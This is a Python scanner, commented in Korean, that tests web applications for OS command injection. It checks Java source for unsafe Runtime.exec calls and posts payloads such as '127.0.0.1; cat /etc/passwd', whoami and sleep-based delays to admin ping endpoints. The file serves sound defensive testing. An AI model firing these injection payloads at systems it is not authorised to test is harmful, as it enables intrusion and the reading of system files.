import requests
import os
import json
import platform

def scan(target_url, login_info=None):
    result = {
        'name': 'OS Command Injection',
        'vulnerable': False,
        'details': [],
        'recommendations': []
    }
    
    try:
        # [Whitebox] Runtime.exec() 사용 코드 검사
        whitebox_result = scan_command_execution_code()
        if whitebox_result['vulnerable']:
            result['vulnerable'] = True
            result['details'].extend(whitebox_result['details'])
            result['recommendations'].extend(whitebox_result['recommendations'])
        
        session = requests.Session()
        if login_info:
            try:
                session.post(f"{target_url}/login", data=login_info, timeout=5)
            except:
                pass
        
        # [Blackbox] OS Command Injection 테스트
        cmd_injection_result = test_command_injection(target_url, session)
        if cmd_injection_result['vulnerable']:
            result['vulnerable'] = True
            result['details'].append(cmd_injection_result['detail'])
            result['recommendations'].append("사용자 입력을 명령어로 직접 실행 금지")
        
        # [Blackbox] Blind Command Injection 테스트 (시간 지연)
        blind_result = test_blind_command_injection(target_url, session)
        if blind_result['vulnerable']:
            result['vulnerable'] = True
            result['details'].append(blind_result['detail'])
            result['recommendations'].append("명령어 실행 함수 사용 최소화 및 입력 검증 강화")
        
        if result['recommendations']:
            result['recommendation'] = ' | '.join(list(set(result['recommendations'])))
        else:
            result['recommendation'] = '안전 - OS Command Injection 방어가 올바르게 구현되어 있음'
        
    except Exception as e:
        result['details'].append(f"오류: {str(e)}")
        result['recommendation'] = '검사 실패'
    
    return result

def load_project_path():
    if os.path.exists('config.json'):
        with open('config.json', 'r', encoding='utf-8') as f:
            return json.load(f).get('project_path', '.')
    return '.'

def scan_command_execution_code():
    """소스 코드 내 Runtime.exec(), ProcessBuilder 사용 여부 검사"""
    result = {'vulnerable': False, 'details': [], 'recommendations': []}
    project_path = load_project_path()
    
    java_files = []
    for root, dirs, files in os.walk(project_path):
        for file in files:
            if file.endswith('.java'):
                java_files.append(os.path.join(root, file))
    
    for java_file in java_files:
        try:
            with open(java_file, 'r', encoding='utf-8') as f:
                content = f.read()
                lines = content.split('\n')
                filename = os.path.basename(java_file)
                
                for i, line in enumerate(lines, 1):
                    # Runtime.exec() 또는 ProcessBuilder에 사용자 입력 연결 확인
                    if ('Runtime.getRuntime().exec' in line or 'ProcessBuilder' in line):
                        # 사용자 입력 변수가 포함되어 있는지 확인
                        if any(var in line.lower() for var in ['target', 'command', 'input', 'param', 'request.getParameter']):
                            result['vulnerable'] = True
                            result['details'].append(f"[Whitebox] {filename}:{i} - OS Command Injection 위험 (사용자 입력이 명령어 실행에 사용됨)")
                            result['recommendations'].append("Runtime.exec() 사용 금지 또는 화이트리스트 검증")
                        
                        # + 연산자로 명령어 조합하는지 확인
                        if '+' in line or 'concat' in line:
                            result['vulnerable'] = True
                            result['details'].append(f"[Whitebox] {filename}:{i} - 명령어 문자열 동적 조합 발견")
                            result['recommendations'].append("명령어 하드코딩 및 파라미터 검증 강화")
        except:
            continue
    
    return result

def test_command_injection(target_url, session):
    """OS Command Injection 페이로드 테스트"""
    result = {'vulnerable': False, 'detail': ''}
    
    # Windows 및 Linux 명령어 페이로드
    payloads = [
        # Windows
        {'target': '127.0.0.1 & ipconfig'},
        {'target': '127.0.0.1 & whoami'},
        {'target': '127.0.0.1 & dir'},
        # Linux
        {'target': '127.0.0.1 | ifconfig'},
        {'target': '127.0.0.1 | whoami'},
        {'target': '127.0.0.1 | ls'},
        {'target': '127.0.0.1; id'},
        {'target': '127.0.0.1; cat /etc/passwd'},
        # Command substitution
        {'target': '127.0.0.1`whoami`'},
        {'target': '127.0.0.1$(whoami)'},
    ]
    
    endpoints = ['/admin/system/ping', '/admin/ping', '/system/ping']
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        
        for payload in payloads:
            try:
                response = session.post(url, data=payload, timeout=10)
                
                if response.status_code == 200:
                    # Windows 명령어 실행 결과 확인
                    windows_indicators = [
                        'IPv4', 'IPv6', 'Subnet Mask', 'Default Gateway',  # ipconfig
                        'Windows IP', 'Ethernet adapter',                   # ipconfig
                        'Volume Serial Number', 'Directory of',             # dir
                        ':\\',                                               # Windows path
                    ]
                    
                    # Linux 명령어 실행 결과 확인
                    linux_indicators = [
                        'inet ', 'netmask', 'ether',                        # ifconfig
                        'uid=', 'gid=', 'groups=',                          # id
                        'root:x:0:0:', '/bin/bash', '/home/',               # /etc/passwd
                        'total ', 'drwx',                                    # ls
                    ]
                    
                    # 응답 내용 확인
                    if any(indicator in response.text for indicator in windows_indicators):
                        result['vulnerable'] = True
                        result['detail'] = f"[Blackbox] OS Command Injection 취약 ({endpoint}): Windows 명령어 실행됨 (payload: {payload['target']})"
                        return result
                    
                    if any(indicator in response.text for indicator in linux_indicators):
                        result['vulnerable'] = True
                        result['detail'] = f"[Blackbox] OS Command Injection 취약 ({endpoint}): Linux 명령어 실행됨 (payload: {payload['target']})"
                        return result
            except:
                continue
    
    return result

def test_blind_command_injection(target_url, session):
    """시간 지연 기반 Blind Command Injection 테스트"""
    result = {'vulnerable': False, 'detail': ''}
    
    # 시간 지연 명령어 (5초)
    time_based_payloads = [
        {'target': '127.0.0.1 & timeout 5'},      # Windows
        {'target': '127.0.0.1 & ping -n 6 127.0.0.1'},  # Windows (5초)
        {'target': '127.0.0.1; sleep 5'},         # Linux
        {'target': '127.0.0.1 | sleep 5'},        # Linux
    ]
    
    endpoints = ['/admin/system/ping', '/admin/ping']
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        
        for payload in time_based_payloads:
            try:
                import time
                start_time = time.time()
                response = session.post(url, data=payload, timeout=15)
                elapsed_time = time.time() - start_time
                
                # 응답 시간이 4초 이상이면 명령어 실행된 것으로 판단
                if elapsed_time >= 4:
                    result['vulnerable'] = True
                    result['detail'] = f"[Blackbox] Blind Command Injection 취약 ({endpoint}): 시간 지연 확인 ({elapsed_time:.1f}초)"
                    return result
            except requests.Timeout:
                # 타임아웃도 명령어 실행의 증거
                result['vulnerable'] = True
                result['detail'] = f"[Blackbox] Blind Command Injection 취약 ({endpoint}): 타임아웃 발생"
                return result
            except:
                continue
    
    return result